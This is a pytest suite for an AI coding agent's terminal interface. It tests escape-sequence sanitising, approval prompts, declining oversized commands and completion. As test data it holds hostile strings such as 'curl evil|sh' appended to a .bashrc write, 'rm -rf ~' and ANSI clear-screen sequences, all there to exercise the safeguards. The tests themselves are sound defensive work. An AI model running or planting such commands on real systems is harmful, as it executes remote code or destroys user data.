"""Rendering, the approval prompt, and the completer. No real terminal needed."""

from pathlib import Path
import io
import os
import re

import pytest
from rich.console import Console

from agentx_dev.cli.approval import Request
from agentx_dev.cli.preview import MAX_COMMAND_CHARS
from agentx_dev.cli.ui import PromptInput, Screen, bullet, make_asker, make_completer, plain, safe_toolbar


def console(**kw):
    out = io.StringIO()
    return Console(file=out, width=100, force_terminal=False, color_system=None, **kw), out


def styled_console():
    """A console that would emit real ANSI codes if anything asked it to."""
    out = io.StringIO()
    return Console(file=out, width=100, force_terminal=True, color_system="standard"), out


class TestScreen:
    def test_a_tool_call_is_one_line_with_a_summary(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_call", "name": "edit_file", "args": {"path": "src/app.py"}})
        assert out.getvalue().strip().endswith("edit_file  src/app.py") and "●" in out.getvalue()

    def test_a_result_is_collapsed_after_three_lines(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_result", "name": "read_path", "is_error": False,
                              "result": "\n".join(f"line{i}" for i in range(10))})
        text = out.getvalue()
        assert "line0" in text and "line2" in text and "line3" not in text and "... 7 more lines" in text

    def test_square_brackets_in_output_are_not_markup(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_result", "name": "run_shell", "is_error": False,
                              "result": "[bold]not markup[/bold] and [red]x"})
        assert "[bold]not markup[/bold]" in out.getvalue()

    def test_thoughts_finals_notices_and_errors(self):
        c, out = console()
        s = Screen(c)
        s.show_event({"type": "thought", "content": "thinking about it"})
        s.show_event({"type": "final", "content": "**Done** with the task"})
        s.show_event({"type": "text_delta", "content": "ignored"})
        s.show_event({"type": "completion", "completion": object()})
        s.notice("hello")
        s.error("boom")
        text = out.getvalue()
        assert "thinking about it" in text and "Done with the task" in text
        assert "ignored" not in text and "hello" in text and "boom" in text

    def test_a_console_that_cannot_print_the_bullet_gets_a_star(self):
        legacy = Console(file=io.TextIOWrapper(io.BytesIO(), encoding="cp1252"), force_terminal=False)
        assert bullet(legacy) == "*"
        c, _ = console()
        assert bullet(c) == "●"

    def test_a_role_at_model_name_is_shown_whole_in_every_team_line(self):
        name = "explorer@claude-sonnet-4-5-20250929"
        assert len(name) > 30
        c, out = console()
        screen = Screen(c)
        screen.team_plan([{"agent": name, "query": "look around"}])
        screen.team_dispatch(name, "look around")
        screen.team_result(name, True, "all good")
        screen.helper_call(name, "read_path", {"path": "a.py"})
        lines = out.getvalue().splitlines()
        assert [name in line for line in lines].count(True) == 4
        assert any(line.startswith("-> " + name + ":") for line in lines)
        assert any(line.startswith("   done (" + name + "):") for line in lines)

    def test_a_tool_call_with_non_dict_args_does_not_crash(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_call", "name": "mystery", "args": "plain text"})
        assert "mystery" in out.getvalue()


class TestNothingModelSuppliedCanStyleOrSpoofTheScreen:
    ESC = "\x1b[2J\x1b[31mFAKE\x1b[0m"

    def test_plain_defuses_escapes_and_direction_overrides(self):
        text = plain("a\x1b[31mb\x07\rc‮d\x9b")
        assert "\x1b" not in text and "\x07" not in text and "\r" not in text
        assert "‮" not in text and "\x9b" not in text
        assert plain("tab\tand\nnewline", keep_newlines=True) == "tab\tand\nnewline"
        assert plain("héllo ✓ 日本 👨‍👩") == "héllo ✓ 日本 👨‍👩"

    def test_plain_escapes_invisible_fillers_and_tag_characters(self):
        hidden = "ㅤ\U000e0041⁯͏ᅟᅠ￹⁤"
        text = plain("a" + hidden + "b")
        for char in hidden:
            assert char not in text
        assert "\\u3164" in text and "\\U000e0041" in text and text.startswith("a") and text.endswith("b")

    def test_blank_looking_characters_are_escaped(self):
        text = plain("a\u2800\xa0\u3000b\u2003\u202f\u205f\u1680 c")
        for escaped in ("\\u2800", "\\xa0", "\\u3000", "\\u2003", "\\u202f", "\\u205f", "\\u1680"):
            assert escaped in text
        assert text.startswith("a") and text.endswith("b\\u2003\\u202f\\u205f\\u1680 c")
        assert plain("plain words stay") == "plain words stay"

    def test_odd_line_breaks_are_escaped_not_split(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_result", "name": "x", "is_error": False,
                              "result": "a\x0bb\x0cc\x1cd\x85e\rf"})
        text = out.getvalue()
        assert len(text.splitlines()) == 1 and "more lines" not in text
        assert "\\x0b" in text and "\\x85" in text and "\\x0d" in text

    def test_crlf_is_one_break(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_result", "name": "x", "is_error": False, "result": "a\r\nb\r\n"})
        assert [l.strip() for l in out.getvalue().splitlines()] == ["a", "b"]

    def test_an_odd_event_or_result_cannot_raise(self):
        class Bad:
            def __str__(self):
                raise RuntimeError("no")
        c, out = console()
        s = Screen(c)
        s.show_event(None)
        s.show_event({"type": "tool_result", "name": "x", "is_error": False, "result": Bad()})
        s.show_event({"type": "tool_call", "name": Bad(), "args": {"path": Bad()}})
        s.show_event({"type": "final", "content": None})

    def test_results_thoughts_calls_notices_and_errors_carry_no_escape_sequences(self):
        c, out = styled_console()
        s = Screen(c)
        s.show_event({"type": "tool_result", "name": "x", "is_error": False, "result": self.ESC})
        s.show_event({"type": "thought", "content": self.ESC})
        s.show_event({"type": "tool_call", "name": "x\x1b[31m", "args": {"path": self.ESC}})
        s.notice(self.ESC)
        s.error(self.ESC)
        text = out.getvalue()
        assert "\x1b[2J" not in text            # the model's own clear-screen never reaches the terminal
        assert "\x1b[31mFAKE" not in text       # nor its red "FAKE" (rich's own styling is never followed by FAKE)

    def test_a_final_answer_is_markdown_but_cannot_inject_escapes_or_links(self):
        c, out = styled_console()
        Screen(c).show_event({"type": "final", "content": f"**bold** {self.ESC} [click](http://evil.example)"})
        text = out.getvalue()
        assert "\x1b[2J" not in text and "\x1b]8;" not in text   # no OSC 8 hyperlink either
        assert "FAKE" in text and "bold" in text

    def test_a_tool_call_name_cannot_break_the_line(self):
        c, out = console()
        Screen(c).show_event({"type": "tool_call", "name": "evil\nFAKE LINE", "args": {}})
        assert len(out.getvalue().strip().splitlines()) == 1


def lines(*items):
    queue = list(items)

    def read(prompt=""):
        read.prompts.append(prompt)
        if not queue:
            raise EOFError
        item = queue.pop(0)
        if isinstance(item, BaseException):
            raise item
        return item
    read.prompts = []
    return read


def edit_request():
    return Request(tool="write_file", kind="edit", subject="a.txt",
                   args={"path": "a.txt", "content": "hi\n", "if_exists": "refuse"},
                   remember=True, grant="all edits this session")


class TestApprovalPrompt:
    def test_yes_shows_the_diff_and_returns_y(self, tmp_path):
        c, out = console()
        answer = make_asker(c, lines("y"), tmp_path)(edit_request())
        assert answer.choice == "y"
        text = out.getvalue()
        assert "Create a.txt" in text and "+hi" in text and "[a] yes, don't ask again" in text

    def test_the_prompt_says_exactly_what_always_will_remember(self, tmp_path):
        c, out = console()
        make_asker(c, lines("y"), tmp_path)(edit_request())
        assert "all edits this session" in out.getvalue()

    def test_a_returns_a(self, tmp_path):
        c, _ = console()
        assert make_asker(c, lines("a"), tmp_path)(edit_request()).choice == "a"

    def test_no_asks_for_a_reason(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines("n", "wrong file"), tmp_path)(edit_request())
        assert (answer.choice, answer.reason) == ("n", "wrong file")

    def test_garbage_is_asked_again(self, tmp_path):
        c, out = console()
        answer = make_asker(c, lines("maybe", "perhaps", "yes"), tmp_path)(edit_request())
        assert answer.choice == "y" and out.getvalue().count("Please answer") == 2

    def test_bare_enter_is_a_no(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines("", ""), tmp_path)(edit_request())
        assert answer.choice == "n"

    def test_ctrl_d_declines(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines(), tmp_path)(edit_request())
        assert answer.choice == "n" and answer.reason

    def test_ctrl_c_declines_and_does_not_run_the_tool(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines(KeyboardInterrupt()), tmp_path)(edit_request())
        assert answer.choice == "n" and answer.reason

    def test_ctrl_c_at_the_reason_prompt_is_still_a_no(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines("n", KeyboardInterrupt()), tmp_path)(edit_request())
        assert (answer.choice, answer.reason) == ("n", "")

    def test_actions_the_gate_cannot_remember_do_not_offer_always(self, tmp_path):
        c, out = console()
        request = Request(tool="delete_path", kind="destructive", subject="x", args={"path": "x"},
                          remember=False)
        answer = make_asker(c, lines("a", "always", "y"), tmp_path)(request)
        assert answer.choice == "y"
        text = out.getvalue()
        assert "[a]" not in text and "don't ask again" not in text and "Please answer y or n." in text

    def test_a_command_is_shown_as_typed(self, tmp_path):
        c, out = console()
        request = Request(tool="run_shell", kind="command", subject="pytest -q", args={"command": "pytest -q [x]"},
                          remember=True, grant="pytest")
        make_asker(c, lines("n", ""), tmp_path)(request)
        text = out.getvalue()
        assert "Run shell command" in text and "pytest -q [x]" in text and "pytest" in text

    def test_markup_and_escapes_in_the_preview_and_title_are_inert(self, tmp_path):
        c, out = styled_console()
        request = Request(tool="run_shell", kind="command", subject="x",
                          args={"command": "echo [bold red]ok[/] \x1b[2J ‮", "cwd": "[green]dir\x1b[0m"},
                          remember=True, grant="echo [red]x[/red]")
        make_asker(c, lines("n", ""), tmp_path)(request)
        text = out.getvalue()
        assert "\x1b[2J" not in text and "‮" not in text
        assert "[bold red]ok[/]" in text and "[green]dir" in text and "[red]x[/red]" in text

    def test_a_file_name_cannot_forge_an_options_line(self, tmp_path):
        c, out = console()
        request = Request(tool="delete_path", kind="destructive", subject="x",
                          args={"path": "x\n[a] yes, don't ask again"}, remember=False)
        make_asker(c, lines("y"), tmp_path)(request)
        shown = [line.strip("│ ").strip() for line in out.getvalue().splitlines()]
        assert not any(line.startswith("[a]") for line in shown)
        assert any("Action: Delete x\\n[a] yes" in line for line in shown)   # the break is shown, not made


def squash(text):
    """Output with panel borders and all whitespace removed, so wrapped text can be searched."""
    return re.sub(r"[\s│╭╮╰╯─|+\-]", "", text)


def squash_spaces(text):
    return " ".join(text.split())


def legacy_console(encoding="cp1252", width=100):
    raw = io.BytesIO()
    file = io.TextIOWrapper(raw, encoding=encoding, newline="")
    return Console(file=file, width=width, force_terminal=False, color_system=None), file, raw


class TestLegacyConsoles:
    def test_screen_does_not_die_on_text_the_console_cannot_encode(self):
        c, file, raw = legacy_console()
        s = Screen(c)
        s.show_event({"type": "tool_result", "name": "x", "is_error": False, "result": "日本語"})
        s.show_event({"type": "final", "content": "done ✓ 日本"})
        s.show_event({"type": "thought", "content": "考える"})
        s.notice("日本")
        s.error("日本")
        file.flush()
        text = raw.getvalue().decode("cp1252")
        assert "\\u65e5" in text and "done" in text and "\\u2713" in text

    def test_a_line_the_console_cannot_encode_is_written_exactly_once(self):
        c, file, raw = legacy_console()
        Screen(c).notice("hi ☃ there")
        file.flush()
        text = raw.getvalue().decode("cp1252")
        assert text.count("hi") == 1 and text.count("\\u2603") == 1 and "there" in text

    def test_team_lines_on_such_a_console_are_not_duplicated(self):
        c, file, raw = legacy_console()
        screen = Screen(c)
        screen.team_plan([{"agent": "explorer", "query": "look ☃ around"}])
        screen.team_dispatch("explorer", "look ☃ around")
        screen.notice("after")
        file.flush()
        text = raw.getvalue().decode("cp1252")
        assert text.count("Team plan") == 1 and text.count("-> explorer") == 1 and text.count("after") == 1
        assert text.count("1. explorer") == 1

    def test_the_asker_does_not_die_on_it_either(self, tmp_path):
        c, file, raw = legacy_console("ascii")
        request = Request(tool="run_shell", kind="command", subject="echo 日本",
                          args={"command": "echo 日本"}, remember=True, grant="echo")
        assert make_asker(c, lines("y"), tmp_path)(request).choice == "y"
        file.flush()
        assert "\\u65e5" in raw.getvalue().decode("ascii")


class TestWhatTheGateJudgesIsWhatTheUserSees:
    def test_a_long_destructive_path_keeps_its_qualifier(self, tmp_path):
        c, out = console()
        path = "a/" * 40
        request = Request(tool="delete_path", kind="destructive", subject=path.rstrip("/"),
                          args={"path": path, "recursive": True}, remember=False)
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "everythinginsideit" in squash(out.getvalue())

    def test_a_move_shows_both_ends(self, tmp_path):
        c, out = console()
        dest = "d/" * 30 + "final-name.txt"
        request = Request(tool="move_file", kind="destructive", subject=f"src.txt -> {dest}",
                          args={"source": "src.txt", "destination": dest}, remember=False)
        make_asker(c, lines("n", ""), tmp_path)(request)
        text = squash(out.getvalue())
        assert squash("final-name.txt") in text and "src.txt" in text

    def test_write_qualifiers_are_not_lost(self, tmp_path):
        (tmp_path / "a.txt").write_text("old", encoding="utf-8")
        c, out = console()
        request = Request(tool="write_file", kind="edit", subject="a.txt",
                          args={"path": "a.txt", "content": "new", "if_exists": "rename"},
                          remember=True, grant="all edits this session")
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "savedunderanewname" in squash(out.getvalue())

    def test_the_subject_the_gate_judges_is_printed(self, tmp_path):
        c, out = console()
        request = Request(tool="edit_file", kind="edit", subject="secret/real.txt",
                          args={"path": "notes/link.txt", "find": "a", "replace": "b"},
                          remember=True, grant="all edits this session")
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "Subject: secret/real.txt" in out.getvalue()

    def test_a_long_subject_is_wrapped_not_cut(self, tmp_path):
        c, out = console()
        subject = "deep/" * 40 + "end.txt"
        request = Request(tool="edit_file", kind="edit", subject=subject,
                          args={"path": subject, "find": "a", "replace": "b"}, remember=False)
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert squash(subject) in squash(out.getvalue())

    def test_the_dangerous_tail_of_a_long_command_is_shown(self, tmp_path):
        c, out = console()
        command = "echo " + "a" * 2100 + "; rm -rf ~"
        request = Request(tool="run_shell", kind="command", subject=command, args={"command": command})
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "rm -rf ~" in squash_spaces(out.getvalue())

    def test_a_command_too_long_to_review_is_declined_unseen(self, tmp_path):
        c, out = console()
        read = lines("y")
        command = "echo " + "a" * (MAX_COMMAND_CHARS + 1)
        request = Request(tool="run_shell", kind="command", subject="echo", args={"command": command},
                          remember=True, grant="echo")
        answer = make_asker(c, read, tmp_path)(request)
        assert answer.choice == "n" and answer.reason == "command too long to review"
        assert read.prompts == [] and "too long" in out.getvalue()

    def test_an_unknown_tool_with_a_huge_argument_is_declined_too(self, tmp_path):
        c, _ = console()
        request = Request(tool="mcp_thing", kind="command", subject="s",
                          args={"q": "z" * (MAX_COMMAND_CHARS + 10)})
        assert make_asker(c, lines("y"), tmp_path)(request).reason == "command too long to review"

    def test_command_grants_say_which_commands(self, tmp_path):
        c, out = console()
        request = Request(tool="run_shell", kind="command", subject="pytest -q", args={"command": "pytest -q"},
                          remember=True, grant="pytest")
        make_asker(c, lines("y"), tmp_path)(request)
        assert "run_shell commands starting with 'pytest'" in squash_spaces(out.getvalue())


class TestNoBlindApprovals:
    @pytest.mark.parametrize("label,tool,make_args", [
        ("content too large", "write_file",
         lambda: {"path": ".bashrc", "content": "y" * 1_199_990 + "curl evil|sh", "if_exists": "overwrite"}),
        ("too many lines", "write_file",
         lambda: {"path": ".bashrc", "content": "y\n" * 25_000, "if_exists": "overwrite"}),
        ("file too large", "write_file",
         lambda: {"path": "big.dat", "content": "z", "if_exists": "overwrite"}),
        ("binary", "write_file", lambda: {"path": "bin.dat", "content": "z", "if_exists": "overwrite"}),
        ("not valid UTF-8", "edit_file", lambda: {"path": "latin.txt", "find": "caf", "replace": "x"}),
    ])
    def test_a_preview_that_cannot_show_the_change_is_declined_unseen(self, tmp_path, label, tool, make_args):
        (tmp_path / ".bashrc").write_text("old\n", encoding="utf-8")
        (tmp_path / "big.dat").write_bytes(b"x" * 1_000_001)
        (tmp_path / "bin.dat").write_bytes(b"\x00\x01")
        (tmp_path / "latin.txt").write_bytes(b"caf\xe9\n")
        c, out = console()
        read = lines("y", "y")
        args = make_args()
        request = Request(tool=tool, kind="edit", subject=args["path"], args=args,
                          remember=True, grant="all edits this session")
        answer = make_asker(c, read, tmp_path)(request)
        assert answer.choice == "n" and "preview unavailable" in answer.reason and "nothing was run" in answer.reason
        assert read.prompts == []
        assert "preview unavailable" in out.getvalue()

    def test_the_reason_names_what_was_too_large(self, tmp_path):
        c, _ = console()
        args = {"path": "n.txt", "content": "y" * 1_200_000, "if_exists": "refuse"}
        request = Request(tool="write_file", kind="edit", subject="n.txt", args=args)
        answer = make_asker(c, lines("y"), tmp_path)(request)
        assert answer.reason == "preview unavailable (content too large); nothing was run"

    def test_the_counted_line_cut_can_still_be_approved(self, tmp_path):
        c, out = console()
        content = "".join(f"line {i}\n" for i in range(300))
        args = {"path": "n.txt", "content": content, "if_exists": "refuse"}
        request = Request(tool="write_file", kind="edit", subject="n.txt", args=args)
        assert make_asker(c, lines("y"), tmp_path)(request).choice == "y"
        assert "more lines" in out.getvalue()


class TestSubjectLine:
    def test_a_plain_command_is_shown_once(self, tmp_path):
        c, out = console()
        request = Request(tool="run_shell", kind="command", subject="rm -rf ~", args={"command": "rm -rf ~"})
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert out.getvalue().count("rm -rf ~") == 1 and "Subject:" not in out.getvalue()

    def test_a_subject_equal_to_the_action_is_not_repeated(self, tmp_path):
        c, out = console()
        request = Request(tool="mystery", kind="command", subject="mystery", args={"q": 1})
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "Subject:" not in out.getvalue()

    def test_a_different_subject_is_still_printed(self, tmp_path):
        c, out = console()
        request = Request(tool="edit_file", kind="edit", subject="secret/real.txt",
                          args={"path": "notes/link.txt", "find": "a", "replace": "b"})
        make_asker(c, lines("n", ""), tmp_path)(request)
        assert "Subject: secret/real.txt" in out.getvalue()


class TestInputFailures:
    @pytest.mark.parametrize("error", [OSError("no console"), UnicodeDecodeError("utf-8", b"\xff", 0, 1, "bad"),
                                       RuntimeError("x")])
    def test_any_read_error_is_a_no(self, tmp_path, error):
        c, _ = console()
        answer = make_asker(c, lines(error), tmp_path)(edit_request())
        assert (answer.choice, answer.reason) == ("n", "could not read an answer")

    def test_a_read_error_at_the_reason_prompt_is_just_no_reason(self, tmp_path):
        c, _ = console()
        answer = make_asker(c, lines("n", OSError("x")), tmp_path)(edit_request())
        assert (answer.choice, answer.reason) == ("n", "")

    def test_the_default_reader_is_plain_input(self, tmp_path, monkeypatch):
        monkeypatch.setattr("builtins.input", lambda prompt="": "y")
        c, _ = console()
        assert make_asker(c, None, tmp_path)(edit_request()).choice == "y"


class TestPromptInputWithoutAConsole:
    def test_falls_back_to_input_and_keeps_a_private_history_file(self, tmp_path, monkeypatch):
        monkeypatch.setattr("agentx_dev.cli.ui.is_terminal", lambda: False)
        monkeypatch.setattr("builtins.input", lambda prompt="": "hello")
        history = tmp_path / "sub" / "history"
        prompt = PromptInput(history_file=history, commands=["/help"], toolbar=lambda: "x",
                             cycle_mode=lambda: None)
        assert prompt.read("> ") == "hello" and prompt.read_short("? ") == "hello"
        assert history.exists()
        if os.name != "nt":
            assert (history.stat().st_mode & 0o777) == 0o600

    def test_a_prompt_toolkit_that_cannot_start_falls_back(self, tmp_path, monkeypatch):
        import prompt_toolkit

        def broken(*args, **kwargs):
            raise OSError("NoConsoleScreenBufferError")
        monkeypatch.setattr("agentx_dev.cli.ui.is_terminal", lambda: True)
        monkeypatch.setattr(prompt_toolkit, "PromptSession", broken)
        monkeypatch.setattr("builtins.input", lambda prompt="": "typed")
        prompt = PromptInput(history_file=tmp_path / "h", commands=[], toolbar=lambda: "x",
                             cycle_mode=lambda: None)
        assert prompt.read() == "typed"

    def test_the_toolbar_text_is_neutralised(self):
        assert safe_toolbar(lambda: "mode \x1b[31mred")() == "mode \\x1b[31mred"
        assert safe_toolbar(lambda: 1 / 0)() == ""


class TestCompleter:
    def complete(self, completer, text, tab=False):
        from prompt_toolkit.completion import CompleteEvent
        from prompt_toolkit.document import Document
        event = CompleteEvent(completion_requested=tab)
        return [c.text for c in completer.get_completions(Document(text), event)]

    def test_commands_pop_up_while_typing_with_their_descriptions(self):
        from prompt_toolkit.completion import CompleteEvent
        from prompt_toolkit.document import Document
        completer = make_completer(["/help", "/model"], {"/help": "List the commands", "/model": "Show the model"})
        found = list(completer.get_completions(Document("/"), CompleteEvent()))     # no Tab pressed
        assert [c.text for c in found] == ["/help", "/model"]
        assert [c.display_meta_text for c in found] == ["List the commands", "Show the model"]

    def test_paths_only_complete_when_tab_is_pressed(self, tmp_path):
        (tmp_path / "notes.txt").write_text("x", encoding="utf-8")
        completer = make_completer(["/help"])
        assert self.complete(completer, f"open {tmp_path.as_posix()}/no") == []
        assert "tes.txt" in self.complete(completer, f"open {tmp_path.as_posix()}/no", tab=True)

    def test_slash_commands_complete(self):
        completer = make_completer(["/help", "/model", "/mode"])
        assert self.complete(completer, "/mo") == ["/model", "/mode"]
        assert self.complete(completer, "/") == ["/help", "/model", "/mode"]
        assert self.complete(completer, "/zzz") == []

    def test_extra_entries_follow_the_commands_and_are_asked_for_each_time(self):
        live = {"/zeta": "(skill) Z"}
        completer = make_completer(["/help"], {"/help": "List"}, extra=lambda: dict(live))
        assert self.complete(completer, "/") == ["/help", "/zeta "]       # a space after a skill: type what you want next
        live["/alpha"] = "(skill) A"                                      # a skill added since is offered at once
        assert self.complete(completer, "/al") == ["/alpha "]
        from prompt_toolkit.completion import CompleteEvent
        from prompt_toolkit.document import Document
        found = list(completer.get_completions(Document("/z"), CompleteEvent()))
        assert [c.display_meta_text for c in found] == ["(skill) Z"]

    def test_a_failing_extra_never_breaks_completion(self):
        def broken():
            raise RuntimeError("disk gone")
        completer = make_completer(["/help"], extra=broken)
        assert self.complete(completer, "/") == ["/help"]

    def test_an_extra_cannot_replace_a_command(self):
        completer = make_completer(["/model"], {"/model": "Show the model"}, extra=lambda: {"/model": "(skill) x"})
        assert self.complete(completer, "/mod") == ["/model"]

    def test_paths_complete_after_a_word(self, tmp_path):
        (tmp_path / "notes.txt").write_text("x", encoding="utf-8")
        completer = make_completer(["/help"])
        found = self.complete(completer, f"open {tmp_path.as_posix()}/no", tab=True)
        assert "tes.txt" in found      # the rest of "notes.txt" after the typed "no"


class TestProgress:
    def test_nothing_is_drawn_when_the_console_is_not_a_terminal(self):
        import io
        from agentx_dev.cli.ui import Progress
        out = io.StringIO()
        progress = Progress(Console(file=out, force_terminal=False))
        assert progress.enabled is False
        progress.start("Thinking")
        progress.stop()
        assert out.getvalue() == ""

    def test_on_a_terminal_it_shows_the_label_and_the_seconds_and_goes_away_when_paused(self):
        import io
        import time
        from agentx_dev.cli.ui import Progress
        out = io.StringIO()
        console = Console(file=out, force_terminal=True, width=60, color_system=None)
        progress = Progress(console)
        progress.start("Running run_python")
        time.sleep(1.2)
        with progress.paused():
            assert progress._live is None                      # stopped while a prompt would be waiting
            console.print("PROMPT")
        assert progress._live is not None                      # and running again after it
        progress.stop()
        assert progress._live is None
        text = out.getvalue()
        assert "Running run_python..." in text and "1s" in text and "PROMPT" in text

    def test_a_label_from_the_model_cannot_carry_escape_codes(self):
        import io
        from agentx_dev.cli.ui import Progress
        out = io.StringIO()
        progress = Progress(Console(file=out, force_terminal=True, width=60, color_system=None))
        progress.start("x\x1b[2Jy")
        progress.stop()
        assert "\x1b[2J" not in out.getvalue()

    def test_stopping_twice_or_before_starting_is_fine(self):
        import io
        from agentx_dev.cli.ui import Progress
        progress = Progress(Console(file=io.StringIO()))
        progress.stop()
        progress.stop()


class TestArrowKeySelection:
    def request(self, remember=True):
        from agentx_dev.cli.approval import Request
        return Request(tool="run_shell", kind="command", subject="pytest -q", args={"command": "pytest -q"},
                       remember=remember, grant="pytest" if remember else "")

    def asker(self, picked, reads=("",)):
        import io
        from agentx_dev.cli.ui import make_asker
        out = io.StringIO()
        seen = []
        replies = list(reads)

        def select(options, default=0, hotkeys=None):
            seen.append((list(options), default, dict(hotkeys or {})))
            return picked

        ask = make_asker(Console(file=out, width=100, color_system=None), lambda prompt="": replies.pop(0),
                         Path("."), select=select)
        return ask, seen, out

    def test_the_menu_lists_yes_always_and_no_with_the_rule_that_would_be_remembered(self):
        ask, seen, _ = self.asker(0)
        assert ask(self.request()).choice == "y"
        options, default, hotkeys = seen[0]
        assert options[0] == "Yes" and options[1].startswith("Yes, and don't ask again")
        assert "pytest" in options[1] and options[2].startswith("No")
        assert default == 0 and hotkeys == {"y": 0, "a": 1, "n": 2}

    def test_picking_the_second_entry_remembers_and_the_third_declines_with_a_reason(self):
        ask, _, _ = self.asker(1)
        assert ask(self.request()).choice == "a"
        ask, _, _ = self.asker(2, reads=("use ls instead",))
        answer = ask(self.request())
        assert (answer.choice, answer.reason) == ("n", "use ls instead")

    def test_without_a_remember_rule_the_menu_has_two_entries(self):
        ask, seen, _ = self.asker(1)
        assert ask(self.request(remember=False)).choice == "n"
        assert len(seen[0][0]) == 2 and "a" not in seen[0][2]

    def test_escape_declines_and_a_menu_that_cannot_be_shown_falls_back_to_typing(self):
        from agentx_dev.cli.ui import CANCELLED
        ask, _, _ = self.asker(CANCELLED)
        assert ask(self.request()).choice == "n"
        ask, _, _ = self.asker(None, reads=("y",))
        assert ask(self.request()).choice == "y"          # typed 'y' through the old prompt

    def test_a_menu_that_raises_is_not_an_approval(self):
        import io
        from agentx_dev.cli.ui import make_asker

        def broken(options, default=0, hotkeys=None):
            raise RuntimeError("no console")

        ask = make_asker(Console(file=io.StringIO()), lambda prompt="": "n", Path("."), select=broken)
        assert ask(self.request()).choice == "n"

    def test_menu_entries_cannot_carry_escape_codes_from_the_rule(self):
        from agentx_dev.cli.approval import Request
        request = Request(tool="run_shell", kind="command", subject="x", args={"command": "x"},
                          remember=True, grant="x\x1b[2J")
        ask, seen, _ = self.asker(0)
        ask(request)
        assert "\x1b" not in seen[0][0][1]

    def test_select_menu_reports_unavailable_without_a_terminal(self):
        from agentx_dev.cli.ui import select_menu
        assert select_menu(["a", "b"]) is None            # pytest has no terminal


class TestSelectMenuKeys:
    """The real prompt_toolkit menu, driven by keys written to a pipe (no terminal needed)."""

    def run_keys(self, keys, options=("Yes", "Always", "No"), default=0, hotkeys=None, monkeypatch=None):
        from prompt_toolkit.application import create_app_session
        from prompt_toolkit.input import create_pipe_input
        from prompt_toolkit.output import DummyOutput
        from agentx_dev.cli import ui
        monkeypatch.setattr(ui, "is_terminal", lambda: True)
        with create_pipe_input() as pipe:
            with create_app_session(input=pipe, output=DummyOutput()):
                pipe.send_text(keys)
                return ui.select_menu(list(options), default, hotkeys)

    def test_enter_takes_the_highlighted_entry(self, monkeypatch):
        assert self.run_keys("\r", monkeypatch=monkeypatch) == 0

    def test_down_arrow_moves_and_enter_confirms(self, monkeypatch):
        assert self.run_keys("\x1b[B\r", monkeypatch=monkeypatch) == 1
        assert self.run_keys("\x1b[B\x1b[B\r", monkeypatch=monkeypatch) == 2

    def test_up_arrow_wraps_to_the_last_entry(self, monkeypatch):
        assert self.run_keys("\x1b[A\r", monkeypatch=monkeypatch) == 2

    def test_a_number_picks_that_entry_at_once(self, monkeypatch):
        assert self.run_keys("3", monkeypatch=monkeypatch) == 2
        assert self.run_keys("2", monkeypatch=monkeypatch) == 1

    def test_a_hotkey_picks_its_entry(self, monkeypatch):
        assert self.run_keys("n", hotkeys={"y": 0, "a": 1, "n": 2}, monkeypatch=monkeypatch) == 2

    def test_escape_and_ctrl_c_cancel(self, monkeypatch):
        from agentx_dev.cli.ui import CANCELLED
        assert self.run_keys("\x1b", monkeypatch=monkeypatch) == CANCELLED
        assert self.run_keys("\x03", monkeypatch=monkeypatch) == CANCELLED


class TestInputLineLooksAlive:
    @pytest.fixture
    def sessions(self, tmp_path):
        from prompt_toolkit.application import create_app_session
        from prompt_toolkit.input import create_pipe_input
        from prompt_toolkit.output import DummyOutput
        from agentx_dev.cli.ui import PromptInput
        with create_pipe_input() as pipe:
            with create_app_session(input=pipe, output=DummyOutput()):
                chat, short = PromptInput._sessions(tmp_path / "history", ["/help"], lambda: "bar", lambda: None, None)
                yield pipe, chat, short

    def test_the_cursor_blinks_so_a_waiting_prompt_is_not_mistaken_for_a_frozen_one(self, sessions):
        from prompt_toolkit.cursor_shapes import CursorShape
        _, chat, short = sessions
        assert chat.app.cursor.get_cursor_shape(chat.app) == CursorShape.BLINKING_BEAM
        assert short.app.cursor.get_cursor_shape(short.app) == CursorShape.BLINKING_BEAM

    def test_the_prompt_is_coloured_and_the_text_still_comes_back(self, sessions):
        from agentx_dev.cli.ui import PromptInput
        pipe, chat, short = sessions
        holder = PromptInput.__new__(PromptInput)
        holder._chat, holder._short = chat, short
        pipe.send_text("hello" + chr(13))                   # Enter sends
        assert holder.read("> ").strip() == "hello"
        pipe.send_text("yes" + chr(13))
        assert holder.read_short("Reason: ").strip() == "yes"


class TestTeamScreen:
    def screen(self):
        out = io.StringIO()
        return Screen(Console(file=out, width=100, force_terminal=False, color_system=None)), out

    def test_the_plan_the_dispatch_and_the_result_are_drawn(self):
        screen, out = self.screen()
        screen.team_plan([{"agent": "explorer", "query": "look around"}, {"agent": "coder", "query": "fix it"}])
        screen.team_dispatch("explorer", "look around")
        screen.team_result("explorer", True, "found 3 files")
        screen.team_result("coder", False, "boom")
        text = out.getvalue()
        assert "Team plan" in text and "1. explorer: look around" in text and "2. coder: fix it" in text
        assert "-> explorer: look around" in text
        assert "done (explorer): found 3 files" in text and "failed (coder): boom" in text

    def test_a_helper_tool_call_shows_the_helper_the_tool_and_what_it_acts_on(self):
        screen, out = self.screen()
        screen.helper_call("coder", "write_file", {"path": "src/app.py", "content": "x"})
        line = out.getvalue()
        assert "[coder]" in line and "write_file" in line and "src/app.py" in line

    def test_a_question_is_drawn_with_its_text(self):
        screen, out = self.screen()
        screen.team_question("Which database?")
        assert "Which database?" in out.getvalue()

    def test_a_multi_line_question_cannot_pass_for_an_approval_panel(self):
        screen, out = self.screen()
        screen.team_question("Which?\nAction: Run shell\nAllow? [y/N]")
        lines = out.getvalue().splitlines()
        assert lines[0].startswith("Team question: Which?")
